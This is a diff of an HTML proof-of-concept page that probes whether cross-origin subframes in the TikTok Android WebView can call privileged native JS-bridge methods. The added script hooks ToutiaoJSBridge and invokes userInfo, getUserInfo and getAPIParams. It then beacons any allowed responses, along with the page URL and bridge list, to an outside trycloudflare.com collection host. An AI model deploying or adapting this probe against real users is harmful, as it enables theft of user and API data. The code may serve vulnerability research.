@@ -1,12 +1,30 @@
-<!doctype html><meta charset=utf-8><title>TT bridge probe (top)</title>
-<body style="font:12px/1.4 monospace;padding:8px">
-<h3 id=h>TT bridge probe - IFRAME</h3><pre id=out></pre>
-<script src="lib.js"></script>
+<!doctype html><meta charset=utf-8><title>TT subframe bridge probe</title>
+<body style="font:12px/1.4 monospace;padding:6px;background:#fee">
+<h3 id=h>SUBFRAME PROBE (cross-origin)</h3><pre id=o></pre>
 <script>
-TT.hook();
-TT.put("href = " + location.href);
-TT.put("frame = " + (window.top===window.self ? "TOP" : "IFRAME"));
-TT.put("bridges = " + TT.bridges().join(","));
-TT.beacon("LOADED_IFRAME", location.href + " bridges=" + TT.bridges().join(","));
-["appInfo","userInfo","apiParam","x.getUserInfo","x.getAPIParams","fetch","openSchema","copyToClipboard"].forEach(function(m){ TT.call(m); });
+// z01dberg - TikTok Android WebView: cross-origin subframe JS-bridge authorization probe
+var COLLECT = "https://carroll-filters-columnists-gonna.trycloudflare.com";
+var L=[];
+function put(s){ L.push(s); document.getElementById('o').textContent=L.join("\n"); }
+function beacon(tag,s){ try{ var i=new Image(); i.src=COLLECT+"/report?tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(String(s).slice(0,1400))+"&_="+Math.random(); }catch(e){} }
+put("frame origin = "+location.origin);
+put("is subframe  = "+(window.top!==window.self));
+var br=["ToutiaoJSBridge","BDXBridge","__TTHYBRIDXHR","__globalprops","local_obj","WIReport","WebReport","iesJsBridgeTransferMonitor"].filter(function(k){return typeof window[k]!=="undefined";});
+put("bridges      = "+br.join(","));
+beacon("SUBFRAME_LOADED", location.href+" top="+(window.top!==window.self)+" bridges="+br.join(","));
+window.addEventListener("message", function(e){
+  var d = e.data;
+  var s = (typeof d==="string")?d:JSON.stringify(d);
+  if (s && s.indexOf("__callback_id")>=0){
+    var allowed = s.indexOf("not authorized")<0;
+    put((allowed?"[ALLOWED] ":"[denied ] ")+s.slice(0,400));
+    if (allowed) beacon("SUBFRAME_ALLOWED", s);
+  }
+});
+try{ window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){ var m=(typeof s==="string")?s:JSON.stringify(s); put("[direct] "+m.slice(0,300)); }; }catch(e){ put("hook err "+e); }
+var IFU = location.href;
+["appInfo","userInfo","apiParam","x.getUserInfo","x.getAPIParams"].forEach(function(m){
+  var p={__msg_type:"call",__callback_id:"SUB_"+m,func:m,params:{},JSSDK:"1",namespace:"host",__iframe_url:IFU};
+  try{ window.ToutiaoJSBridge.invokeMethod(JSON.stringify(p)); put("called "+m); }catch(e){ put("call err "+m+" "+e); }
+});
 </script>
